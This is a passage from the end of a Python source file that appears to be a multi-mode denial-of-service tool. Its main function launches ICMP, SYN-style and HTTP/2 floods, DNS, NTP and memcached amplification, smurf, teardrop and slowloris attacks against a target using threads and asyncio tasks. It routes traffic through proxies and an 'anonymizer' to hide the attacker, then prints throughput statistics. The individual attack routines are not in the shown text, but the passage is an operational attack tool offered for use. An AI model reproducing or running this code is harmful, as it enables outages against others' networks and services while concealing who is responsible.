        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "dns-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "ftp-flood":
        target_ip = await resolve_target(target)
        target_port = 21  # Default port for FTP
        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
    elif args.attack_mode == "ssh-flood":
        target_ip = await resolve_target(target)
        target_port = 22  # Default port for SSH
        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
    elif args.attack_mode == "ntp-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "memcached-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "smurf":
        target_ip = await resolve_target(target)
        threading.Thread(target=smurf_attack, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "teardrop":
        target_ip = await resolve_target(target)
        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration)).start()
    elif args.attack_mode == "slowloris":
        for _ in range(args.threads):
            task = asyncio.create_task(slowloris_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
            tasks.append(task)
    elif args.attack_mode == "http2-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
            tasks.append(task)
    else:
        for _ in range(args.threads):
            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
            tasks.append(task)

        # Display status in a separate thread
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()

    # Wait for the specified duration, then stop all tasks
    await asyncio.sleep(args.duration)
    stop_event.set()

    # Wait for all asyncio tasks to complete
    await asyncio.gather(*tasks, return_exceptions=True)

    # Display final statistics
    stats = calculate_rps_stats()
    print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")

    if args.results:
        print(f"{GREEN}Results saved to {args.results}{RESET}")

    # If --anonymizer is provided, stop anonymizer after the attack
    if args.anonymizer == "start":
        print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
        run_anonymizer("stop")

if __name__ == "__main__":
    # Handle signals for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    if len(sys.argv) == 1:
        minimal_help()
        sys.exit(0)

    # Run the asyncio event loop
    asyncio.run(main())
